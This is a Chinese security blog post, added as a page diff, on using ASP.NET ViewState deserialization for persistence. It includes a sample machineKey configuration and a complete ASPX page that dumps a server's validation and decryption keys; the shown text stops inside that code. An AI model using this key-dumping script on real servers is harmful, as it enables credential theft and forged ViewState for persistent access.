@@ -1,0 +1,976 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+    <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
+    <meta charset="UTF-8" />
+
+    <meta name="generator" content="Hugo 0.88.1" /><meta name="theme-color" content="#16171d" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+    <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
+    
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+
+    <title>利用.NET 反序列化做权限维持 | MYZXCG</title>
+
+    <link rel="stylesheet" href="/css/meme.min.ee7d92038178eda958210f69458541e2686ada11055b93762d6d324f2acc47c5.css"/>
+
+    
+    
+        <script src="/js/meme.min.4194bf2034241e3757fbbbf5fe4db43d0ff17c81f4496e6bc931504f0978cbd2.js"></script>
+
+    
+
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" media="print" onload="this.media='all'" />
+        <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" /></noscript>
+
+    <meta name="author" content="myzxcg" /><meta name="description" content="ViewState 基本概念 HTTP模型是无状态的，这意味着每当客户端向服务端发起一个获取页面的请求时……" />
+
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-title" content="MYZXCG" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+    <meta name="mobile-web-app-capable" content="yes" />
+    <meta name="application-name" content="MYZXCG" />
+    <meta name="msapplication-starturl" content="../../../" />
+    <meta name="msapplication-TileColor" content="#603cba" />
+    <meta name="msapplication-TileImage" content="../../../icons/mstile-150x150.png" />
+    <link rel="manifest" href="/manifest.json" />
+
+
+    
+    
+
+    
+    <link rel="canonical" href="https://myzxcg.com/2021/11/%E5%88%A9%E7%94%A8.NET-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%81%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" />
+    
+
+<script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "datePublished": "2021-11-21T16:14:05+08:00",
+        "dateModified": "2021-11-21T17:21:34+08:00",
+        "url": "https://myzxcg.com/2021/11/%E5%88%A9%E7%94%A8.NET-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%81%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/",
+        "headline": "利用.NET 反序列化做权限维持",
+        "description": "ViewState 基本概念 HTTP模型是无状态的，这意味着每当客户端向服务端发起一个获取页面的请求时……",
+        "inLanguage" : "zh-CN",
+        "articleSection": "posts",
+        "wordCount":  2858 ,
+        "image": "https://myzxcg.com/icons/favicon.ico",
+        "author": {
+            "@type": "Person",
+            "description": "专注于Web安全、内网渗透. 记录学习与渗透过程中遇到的有意思的点, 分享技巧与知识. 欢迎交流～",
+            "email": "myzx.xcg@gmail.com",
+            "image": "https://myzxcg.com/avatar.png",
+            "url": "https://myzxcg.com/",
+            "name": "myzxcg"
+        },
+        "license": "[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)",
+        "publisher": {
+            "@type": "Organization",
+            "name": "MYZXCG",
+            "logo": {
+                "@type": "ImageObject",
+                "url": "https://myzxcg.com/icons/favicon.ico"
+            },
+            "url": "https://myzxcg.com/"
+        },
+        "mainEntityOfPage": {
+            "@type": "WebSite",
+            "@id": "https://myzxcg.com/"
+        }
+    }
+</script>
+
+    
+
+<meta name="twitter:card" content="summary" />
+
+<meta name="twitter:site" content="@myzxcg" />
+<meta name="twitter:creator" content="@myzxcg" />
+
+    
+
+
+
+<meta property="og:title" content="利用.NET 反序列化做权限维持" />
+<meta property="og:description" content="ViewState 基本概念 HTTP模型是无状态的，这意味着每当客户端向服务端发起一个获取页面的请求时……" />
+<meta property="og:url" content="https://myzxcg.com/2021/11/%E5%88%A9%E7%94%A8.NET-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%81%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" />
+<meta property="og:site_name" content="MYZXCG" />
+<meta property="og:locale" content="zh" /><meta property="og:image" content="https://myzxcg.com/icons/favicon.ico" />
+    <meta property="og:type" content="article" />
+    <meta property="article:published_time" content="2021-11-21T16:14:05&#43;08:00" />
+    <meta property="article:modified_time" content="2021-11-21T17:21:34&#43;08:00" />
+    
+    <meta property="article:section" content="posts" />
+
+
+        <link rel="preconnect" href="https://www.google-analytics.com" crossorigin />
+
+        
+
+
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-Y0LZRMN44V"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'G-Y0LZRMN44V');
+    </script>
+
+
+
+
+    
+    
+
+    
+</head>
+
+    <body>
+        <div class="container">
+            
+    <header class="header">
+        
+            <div class="header-wrapper">
+                <div class="header-inner single">
+                    
+    <div class="site-brand">
+        
+            <a href="/" class="brand">MYZXCG</a>
+        
+    </div>
+
+                    <nav class="nav">
+    <ul class="menu" id="menu">
+        
+            
+        
+        
+        
+        
+            
+                <li class="menu-item"><a href="/archives/"><span class="menu-item-name">文章</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/tags/"><span class="menu-item-name">标签</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/about/"><span class="menu-item-name">关于</span></a>
+                </li>
+            
+        
+            
+                
+                    
+                    
+                
+            
+        
+            
+                
+            
+        
+    </ul>
+</nav>
+
+                    
+                </div>
+            </div>
+            
+    <input type="checkbox" id="nav-toggle" aria-hidden="true" />
+    <label for="nav-toggle" class="nav-toggle"></label>
+    <label for="nav-toggle" class="nav-curtain"></label>
+
+
+        
+    </header>
+
+
+
+
+            
+            
+    <main class="main single" id="main">
+    <div class="main-inner">
+
+        
+
+        <article class="content post h-entry" data-align="justify" data-type="posts" data-toc-num="true">
+
+            <h1 class="post-title p-name">利用.NET 反序列化做权限维持</h1>
+
+            
+
+            
+                
+            
+
+            
+                
+
+<div class="post-meta">
+    
+        
+        <time datetime="2021-11-21T16:14:05&#43;08:00" class="post-meta-item published dt-published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2021.11.21</time>
+    
+    
+    
+    
+        
+        
+        
+            
+        
+    
+    
+    
+        
+        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;6&nbsp;分钟</span>
+    
+
+   
+    
+
+    
+    
+</div>
+
+            
+
+            <nav class="contents">
+  <h2 id="contents" class="contents-title">目录</h2><ol class="toc">
+    <li><a id="contents:viewstate-基本概念" href="#viewstate-基本概念">ViewState 基本概念</a>
+      <ol>
+        <li><a id="contents:反序列化与参数介绍" href="#反序列化与参数介绍">反序列化与参数介绍</a></li>
+      </ol>
+    </li>
+    <li><a id="contents:获取-machinekey" href="#获取-machinekey">获取 MachineKey</a></li>
+    <li><a id="contents:payload-利用" href="#payload-利用">Payload 利用</a></li>
+    <li><a id="contents:反序列化执行代码" href="#反序列化执行代码">反序列化执行代码</a></li>
+    <li><a id="contents:测试代码" href="#测试代码">测试代码</a></li>
+    <li><a id="contents:参考" href="#参考">参考</a></li>
+  </ol>
+</nav><div class="post-body e-content">
+                <h2 id="viewstate-基本概念"><a href="#viewstate-基本概念" class="anchor-link">#</a><a href="#contents:viewstate-基本概念" class="headings">ViewState 基本概念</a></h2>
+<p>HTTP模型是无状态的，这意味着每当客户端向服务端发起一个获取页面的请求时，都会导致服务端创建一个新的page类的实例，并且一个往返之后，这个page实例会被立刻销毁。如果想获取上一次请求的page实例的值，就可以利用VewState。</p>
+<p>ASP.NET Web 应用程序使用ViewState来维护页面状态，并在Web表单中保留数据（当设置了ViewState <code>runat = &quot;server&quot;</code> 后，会有一个隐藏字段_ViewState）。一个页面被返回给客户端时，页面及其控件属性的变化将被确定，并存储在一个名为 <code>_VIEWSTATE</code> 的隐藏输入字段的值中。当页面再次向服务端发送请求时，<code>_VIEWSTATE</code> 字段将与HTTP请求一起发送到服务器。服务端对ViewState进行反序列化，获得属性，并赋给控件对应的值。</p>
+<h3 id="反序列化与参数介绍"><a href="#反序列化与参数介绍" class="anchor-link">#</a><a href="#contents:反序列化与参数介绍" class="headings">反序列化与参数介绍</a></h3>
+<ol>
+<li>
+<p><strong>序列化</strong></p>
+<p>ASP.NET 有各种序列化和反序列化库称为 formatter ，它序列化对象到字节流。如 <code>ObjectStateFormatter、LOSFormatter、BinaryFormatter</code>等。ASP.NET 使用LosFormatter序列化 ViewState，并将其作为隐藏的表单字段发送到客户端。一旦序列化ViewState 在 POST 请求期间被发送回服务器，它将使用 ObjectStateFormatter 进行反序列化。</p>
+</li>
+<li>
+<p><strong>相关参数</strong></p>
+<p>在web.config 可以使用以下的参数来开启或关闭ViewState的一些功能，例如：</p>
+<p><code>&lt;pages enableViewState=&quot;false&quot; enableViewStateMac=&quot;false&quot; viewStateEncryptionMode=&quot;Always&quot; /&gt;</code></p>
+<ul>
+<li>配置<code>ViewStateEncryptionMode=&quot;Always&quot;</code>来启用ViewState的加密（仅影响ViewState的生成，不影响它的解密），保证ViewState不会发生信息泄露。（Always表示始终加密，Auto为默认值，表示调用RegisterRequiresViewStateEncryption() 方法请求才进行加密，Never表示永远不会对其进行加密）</li>
+<li>配置<code>enableViewStateMac=&quot;true&quot;</code> 在ViewState 中启用 MAC（消息身份验证代码，保证 ViewState 不受篡改，在反序列化期间对 ViewState 的值进行完整性检查）。</li>
+<li>配置 <code>enableViewState</code> 用于设置是否开启viewState，但即使设置为false，ASP.NET服务器也始终被动解析 ViewState。</li>
+</ul>
+<p><em><strong>Tips:</strong></em> 从.NET 4.5.2 开始，强制启用ViewStateMac功能，即使将 EnableViewStateMac设置为false，也不能禁止ViewState的校验。</p>
+</li>
+</ol>
+<h2 id="获取-machinekey"><a href="#获取-machinekey" class="anchor-link">#</a><a href="#contents:获取-machinekey" class="headings">获取 MachineKey</a></h2>
+<ol>
+<li>
+<p>如果主动在Web.config 配置，则读取Web.config即可。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"> <span class="c">&lt;!--目前在最新版本的.NET Framework中，默认的验证算法是HMACSHA256，默认的解密算法是AES。--&gt;</span>
+ <span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+ <span class="nt">&lt;configuration&gt;</span>
+ <span class="nt">&lt;system.web&gt;</span>
+ <span class="nt">&lt;customErrors</span> <span class="na">mode=</span><span class="s">&#34;Off&#34;</span> <span class="nt">/&gt;</span>
+ <span class="nt">&lt;machineKey</span> <span class="na">validationKey=</span><span class="s">&#34;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&#34;</span> <span class="na">decryptionKey=</span><span class="s">&#34;E9D2490BD0075B51D1BA5288514514AF&#34;</span> <span class="na">validation=</span><span class="s">&#34;SHA1&#34;</span> <span class="na">decryption=</span><span class="s">&#34;3DES&#34;</span> <span class="nt">/&gt;</span>
+ <span class="nt">&lt;/system.web&gt;</span>
+ <span class="nt">&lt;/configuration&gt;</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+<li>
+<p>通过注册表或反射从System.Web中获取。</p>
+<p>参考：https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span><span class="lnt">95
+</span><span class="lnt">96
+</span><span class="lnt">97
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="p">&lt;%</span><span class="err">@</span> <span class="n">Page</span> <span class="n">Language</span><span class="p">=</span><span class="s">&#34;C#&#34;</span> <span class="p">%&gt;</span>
+<span class="p">&lt;%</span>
+<span class="c1">// Read https://soroush.secproject.com/blog/2019/05/danger-of-stealing-auto-generated-net-machine-keys/
+</span><span class="c1"></span><span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&lt;hr/&gt;&#34;</span><span class="p">);</span>
+<span class="kt">byte</span><span class="p">[]</span> <span class="n">autoGenKeyV4</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">[])</span> <span class="n">Microsoft</span><span class="p">.</span><span class="n">Win32</span><span class="p">.</span><span class="n">Registry</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="s">&#34;HKEY_CURRENT_USER\\Software\\Microsoft\\ASP.NET\\4.0.30319.0\\&#34;</span><span class="p">,</span> <span class="s">&#34;AutoGenKeyV4&#34;</span><span class="p">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[]{});</span>
+<span class="k">if</span><span class="p">(</span><span class="n">autoGenKeyV4</span><span class="p">!=</span><span class="k">null</span><span class="p">)</span>
+	<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;HKCU\\Software\\Microsoft\\ASP.NET\\4.0.30319.0\\AutoGenKeyV4: &#34;</span><span class="p">+</span><span class="n">BitConverter</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">autoGenKeyV4</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s">&#34;-&#34;</span><span class="p">,</span> <span class="kt">string</span><span class="p">.</span><span class="n">Empty</span><span class="p">));</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+<span class="kt">byte</span><span class="p">[]</span> <span class="n">autoGenKey</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">[])</span> <span class="n">Microsoft</span><span class="p">.</span><span class="n">Win32</span><span class="p">.</span><span class="n">Registry</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="s">&#34;HKEY_CURRENT_USER\\Software\\Microsoft\\ASP.NET\\2.0.50727.0\\&#34;</span><span class="p">,</span> <span class="s">&#34;AutoGenKey&#34;</span><span class="p">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[]{});</span>
+<span class="k">if</span><span class="p">(</span><span class="n">autoGenKey</span><span class="p">!=</span><span class="k">null</span><span class="p">)</span>
+	<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;HKCU\\Software\\Microsoft\\ASP.NET\\2.0.50727.0\\AutoGenKey: &#34;</span><span class="p">+</span><span class="n">BitConverter</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">autoGenKey</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s">&#34;-&#34;</span><span class="p">,</span> <span class="kt">string</span><span class="p">.</span><span class="n">Empty</span><span class="p">));</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&lt;hr/&gt;&#34;</span><span class="p">);</span>
+<span class="kt">var</span> <span class="n">systemWebAsm</span> <span class="p">=</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span><span class="s">&#34;System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&#34;</span><span class="p">);</span>
+<span class="kt">var</span> <span class="n">machineKeySectionType</span> <span class="p">=</span> <span class="n">systemWebAsm</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s">&#34;System.Web.Configuration.MachineKeySection&#34;</span><span class="p">);</span>
+<span class="kt">var</span> <span class="n">getApplicationConfigMethod</span> <span class="p">=</span> <span class="n">machineKeySectionType</span><span class="p">.</span><span class="n">GetMethod</span><span class="p">(</span><span class="s">&#34;GetApplicationConfig&#34;</span><span class="p">,</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">Static</span> <span class="p">|</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span><span class="p">);</span>
+<span class="kt">var</span> <span class="n">config</span> <span class="p">=</span> <span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="n">Web</span><span class="p">.</span><span class="n">Configuration</span><span class="p">.</span><span class="n">MachineKeySection</span><span class="p">)</span><span class="n">getApplicationConfigMethod</span><span class="p">.</span><span class="n">Invoke</span><span class="p">(</span><span class="k">null</span><span class="p">,</span> <span class="k">new</span> <span class="kt">object</span><span class="p">[</span><span class="m">0</span><span class="p">]);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;ValidationKey:&lt;/b&gt; &#34;</span><span class="p">+</span><span class="n">config</span><span class="p">.</span><span class="n">ValidationKey</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;DecryptionKey:&lt;/b&gt; &#34;</span><span class="p">+</span> <span class="n">config</span><span class="p">.</span><span class="n">DecryptionKey</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&lt;hr/&gt;&#34;</span><span class="p">);</span>
+<span class="kt">var</span> <span class="n">typeMachineKeyMasterKeyProvider</span> <span class="p">=</span> <span class="n">systemWebAsm</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s">&#34;System.Web.Security.Cryptography.MachineKeyMasterKeyProvider&#34;</span><span class="p">);</span>
+<span class="kt">var</span> <span class="n">instance</span> <span class="p">=</span> <span class="n">typeMachineKeyMasterKeyProvider</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">(</span>
+	<span class="n">typeMachineKeyMasterKeyProvider</span><span class="p">.</span><span class="n">FullName</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span>
+	<span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span> <span class="p">|</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span><span class="p">,</span>
+	<span class="k">null</span><span class="p">,</span> <span class="k">new</span> <span class="kt">object</span><span class="p">[]</span> <span class="p">{</span> <span class="n">config</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span> <span class="p">},</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
+<span class="kt">var</span> <span class="n">validationKey</span> <span class="p">=</span> <span class="n">typeMachineKeyMasterKeyProvider</span><span class="p">.</span><span class="n">GetMethod</span><span class="p">(</span><span class="s">&#34;GetValidationKey&#34;</span><span class="p">).</span><span class="n">Invoke</span><span class="p">(</span><span class="n">instance</span><span class="p">,</span> <span class="k">new</span> <span class="kt">object</span><span class="p">[</span><span class="m">0</span><span class="p">]);</span>
+<span class="kt">byte</span><span class="p">[]</span> <span class="m">_</span><span class="n">validationKey</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">[])</span><span class="n">validationKey</span><span class="p">.</span><span class="n">GetType</span><span class="p">().</span><span class="n">GetMethod</span><span class="p">(</span><span class="s">&#34;GetKeyMaterial&#34;</span><span class="p">).</span><span class="n">Invoke</span><span class="p">(</span><span class="n">validationKey</span><span class="p">,</span> <span class="k">new</span> <span class="kt">object</span><span class="p">[</span><span class="m">0</span><span class="p">]);</span>
+<span class="kt">var</span> <span class="n">encryptionKey</span> <span class="p">=</span> <span class="n">typeMachineKeyMasterKeyProvider</span><span class="p">.</span><span class="n">GetMethod</span><span class="p">(</span><span class="s">&#34;GetEncryptionKey&#34;</span><span class="p">).</span><span class="n">Invoke</span><span class="p">(</span><span class="n">instance</span><span class="p">,</span> <span class="k">new</span> <span class="kt">object</span><span class="p">[</span><span class="m">0</span><span class="p">]);</span>
+<span class="kt">byte</span><span class="p">[]</span> <span class="m">_d</span><span class="n">ecryptionKey</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">[])</span><span class="n">validationKey</span><span class="p">.</span><span class="n">GetType</span><span class="p">().</span><span class="n">GetMethod</span><span class="p">(</span><span class="s">&#34;GetKeyMaterial&#34;</span><span class="p">).</span><span class="n">Invoke</span><span class="p">(</span><span class="n">encryptionKey</span><span class="p">,</span> <span class="k">new</span> <span class="kt">object</span><span class="p">[</span><span class="m">0</span><span class="p">]);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&lt;b&gt;ASP.NET 4.5 and above:&lt;/b&gt;&lt;br/&gt;&#34;</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;validationAlg:&lt;/b&gt; &#34;</span><span class="p">+</span><span class="n">config</span><span class="p">.</span><span class="n">Validation</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;validationKey:&lt;/b&gt; &#34;</span><span class="p">+</span><span class="n">BitConverter</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="m">_</span><span class="n">validationKey</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s">&#34;-&#34;</span><span class="p">,</span> <span class="kt">string</span><span class="p">.</span><span class="n">Empty</span><span class="p">));</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;decryptionAlg:&lt;/b&gt; &#34;</span><span class="p">+</span><span class="n">config</span><span class="p">.</span><span class="n">Decryption</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;decryptionKey:&lt;/b&gt; &#34;</span><span class="p">+</span><span class="n">BitConverter</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="m">_d</span><span class="n">ecryptionKey</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s">&#34;-&#34;</span><span class="p">,</span> <span class="kt">string</span><span class="p">.</span><span class="n">Empty</span><span class="p">));</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&lt;hr/&gt;&#34;</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&lt;b&gt;ASP.NET 4.0 and below:&lt;/b&gt;&lt;br/&gt;&#34;</span><span class="p">);</span>
+<span class="kt">byte</span><span class="p">[]</span> <span class="n">autogenKeys</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">[])</span><span class="k">typeof</span><span class="p">(</span><span class="n">HttpRuntime</span><span class="p">).</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;s_autogenKeys&#34;</span><span class="p">,</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span> <span class="p">|</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">Static</span><span class="p">).</span><span class="n">GetValue</span><span class="p">(</span><span class="k">null</span><span class="p">);</span>
+<span class="kt">int</span> <span class="n">validationKeySize</span> <span class="p">=</span> <span class="m">64</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">decryptionKeySize</span> <span class="p">=</span> <span class="m">24</span><span class="p">;</span>
